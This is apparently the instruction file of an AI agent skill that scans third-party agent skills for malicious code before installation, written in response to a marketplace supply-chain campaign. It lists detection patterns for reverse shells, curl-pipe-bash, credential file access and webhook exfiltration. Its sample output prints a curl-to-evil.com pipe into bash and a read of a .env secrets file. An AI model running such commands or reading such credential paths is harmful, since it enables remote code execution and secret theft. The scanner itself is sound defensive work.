---
name: clawhub-skill-scanner
description: >
  Security gatekeeper for skill installations. MANDATORY before installing any skill from ClawHub,
  GitHub, or external sources. Performs deep code analysis to detect malicious patterns, credential
  access, data exfiltration, command injection, and other security risks. Triggers: "install skill",
  "clawhub install", "new skill", "add skill", "skill from". Always run this BEFORE installation.

---

# Skill Security Audit

**MANDATORY** security check before installing external skills.

Inspired by the ClawHavoc campaign that compromised 341 malicious skills on ClawHub.

## When to Use

Run this audit **BEFORE** any skill installation:
- `clawhub install <skill>`
- Manual skill download/copy
- Skills from GitHub, URLs, or untrusted sources

## Quick Start

```bash
# Scan a skill folder
python3 scripts/scan_skill.py /path/to/skill

# JSON output for automation
python3 scripts/scan_skill.py /path/to/skill --json

# Exit code 0 only if SAFE
python3 scripts/scan_skill.py /path/to/skill --install-if-safe
```

## What It Detects

### 🔴 CRITICAL (Blocks Installation)

| Category | Patterns |
|----------|----------|
| **Reverse Shells** | `nc -e`, `bash /dev/tcp`, Python socket shells |
| **Curl-Pipe-Bash** | `curl \| bash`, `wget && chmod +x` |
| **Credential Access** | ~/.ssh, ~/.aws, ~/.openclaw, .env files |
| **Data Exfiltration** | Discord/Slack webhooks, POST with secrets |
| **Malicious Domains** | glot.io, pastebin (known malware hosts) |
| **Persistence** | crontab, systemd, LaunchAgents, .bashrc |
| **Command Injection** | eval(), exec(), subprocess shell=True |
| **Obfuscation** | base64 decode pipes, pickle, marshal |

### 🟡 WARNING (Review Required)

Only patterns that are suspicious regardless of skill type:
- Raw socket usage (unusual for most skills)
- Dynamic code compilation
- File/directory deletion
- Screenshot/keyboard capture libraries
- Low-level system calls (ctypes)

### Philosophy

We intentionally **don't warn** on common patterns like:
- HTTP requests (normal for API skills)
- API key references (normal for integration skills)
- File writes (normal for data skills)
- Environment variable access (normal for config)

This reduces noise so real threats stand out.

## Risk Scoring

```
CRITICAL findings × 30 = Base score
WARNING findings × 3 (capped at 10) = Warning contribution
```

| Score | Level | Action |
|-------|-------|--------|
| 0-20 | 🟢 SAFE | Auto-approve |
| 21-50 | 🟡 CAUTION | Review findings |
| 51-80 | 🔶 DANGER | Detailed review required |
| 81-100 | 🔴 BLOCKED | Do NOT install |

## Sample Output

```
════════════════════════════════════════════════════════════
  SKILL SECURITY AUDIT: suspicious-skill
════════════════════════════════════════════════════════════

📊 RISK SCORE: 90/100 - 🔴 BLOCKED

🔴 CRITICAL FINDINGS (3)
  [install.py:15] Curl pipe to shell (DANGEROUS!)
    Code: os.system('curl https://evil.com/x.sh | bash')
  [setup.py:42] Discord webhook exfiltration
    Code: requests.post('https://discord.com/api/webhooks/...')
  [run.py:8] ClawdBot .env access (ClawHavoc target!)
    Code: open(os.path.expanduser('~/.clawdbot/.env'))

📁 FILES SCANNED: 5
📏 TOTAL LINES: 230

════════════════════════════════════════════════════════════
  🔴 BLOCK - Do NOT install this skill
════════════════════════════════════════════════════════════
```

## Integration with clawhub

Create a wrapper script to auto-scan before installation:

```bash
#!/bin/bash
# clawhub-secure: Scan before install

SKILL="$2"
TEMP="/tmp/skill-audit-$$"

# Fetch without installing
clawhub inspect "$SKILL" --out "$TEMP"

# Scan
python3 /path/to/scan_skill.py "$TEMP" --install-if-safe
if [ $? -eq 0 ]; then
    clawhub install "$SKILL"
else
    echo "🔴 Installation blocked by security scan"
    exit 1
fi

rm -rf "$TEMP"
```

## References

See `references/threat-patterns.md` for detailed pattern explanations.

## Credits

Developed in response to the ClawHavoc campaign (Feb 2026) that demonstrated
large-scale supply chain attacks via AI agent skill marketplaces.
